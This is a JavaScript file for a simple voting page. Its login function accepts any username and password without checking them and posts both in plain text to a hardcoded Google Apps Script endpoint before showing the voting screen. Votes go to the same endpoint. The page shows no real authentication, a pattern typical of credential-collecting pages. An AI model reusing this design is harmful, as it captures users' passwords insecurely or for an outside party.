const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzLmQ4ONNdhHZviH5E2dv7WpRtwlcI9klKyLucpfS5LFMi-YtYUEcSVR5NmYzuuhlBC/exec"; // Add Google Apps Script URL

function login() {
    let username = document.getElementById('username').value;
    let password = document.getElementById('password').value;

    if (username && password) {
        localStorage.setItem('username', username);

        let loginData = { username: username, password: password };

        fetch(GOOGLE_SCRIPT_URL, {
            method: "POST",
            body: JSON.stringify(loginData),
            headers: { "Content-Type": "application/json" }
        })
        .then(() => {
            document.getElementById('login-page').style.display = 'none';
            document.getElementById('voting-page').style.display = 'block';
        })
        .catch(error => console.error("Error:", error));
    } else {
        alert("Please enter both username and password.");
    }
}

function vote(option) {
    let username = localStorage.getItem('username');

    if (username) {
        let voteData = { username: username, vote: option };

        fetch(GOOGLE_SCRIPT_URL, {
            method: "POST",
            body: JSON.stringify(voteData),
            headers: { "Content-Type": "application/json" }
        })
        .then(() => {
            document.getElementById('voting-page').style.display = 'none';
            document.getElementById('thank-you').style.display = 'block';
        })
        .catch(error => console.error("Error:", error));
    }
}